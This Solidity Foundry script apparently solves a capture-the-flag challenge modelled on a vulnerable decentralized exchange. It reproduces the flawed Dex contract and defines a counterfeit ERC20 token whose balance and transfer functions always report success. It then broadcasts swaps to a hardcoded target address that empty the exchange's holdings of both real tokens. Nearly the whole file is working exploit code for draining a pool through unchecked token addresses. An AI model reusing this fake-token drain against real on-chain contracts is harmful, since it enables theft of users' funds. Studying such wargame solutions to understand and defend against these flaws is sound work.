// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/access/Ownable.sol";
import "openzeppelin-contracts/utils/math/Math.sol";

contract Dex is Ownable {
  address public token1;
  address public token2;

  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint256 amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(
    address from,
    address to,
    uint256 amount
  ) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(
    address from,
    address to,
    uint256 amount
  ) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint256 amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint256) {
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;

  constructor(
    address dexInstance,
    string memory name,
    string memory symbol,
    uint256 initialSupply
  ) ERC20(name, symbol) {
    _mint(msg.sender, initialSupply);
    _dex = dexInstance;
  }

  function approve(
    address owner,
    address spender,
    uint256 amount
  ) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract MyToken is ERC20 {
  constructor() ERC20("", "") {}

  function balanceOf(address) public view override returns (uint256) {
    return 1;
  }

  function transferFrom(
    address,
    address,
    uint256
  ) public override returns (bool) {
    return true;
  }
}

contract Solve is Script, Test {
  address target = address(0x4F406085436416B040d84795ace88e6B127ccEf8);

  function run() public {
    vm.startBroadcast();

    Dex dex = Dex(target);
    SwappableToken token1 = SwappableToken(dex.token1());
    SwappableToken token2 = SwappableToken(dex.token2());

    console.log("DEX token1 balance: %s", token1.balanceOf(address(dex)));
    console.log("DEX token2 balance: %s", token2.balanceOf(address(dex)));

    MyToken token = new MyToken();
    dex.swap(address(token), address(token1), 1);
    dex.swap(address(token), address(token2), 1);

    console.log("My token1 balance: %s", token1.balanceOf(msg.sender));
    console.log("My token2 balance: %s", token2.balanceOf(msg.sender));

    vm.stopBroadcast();
  }
}
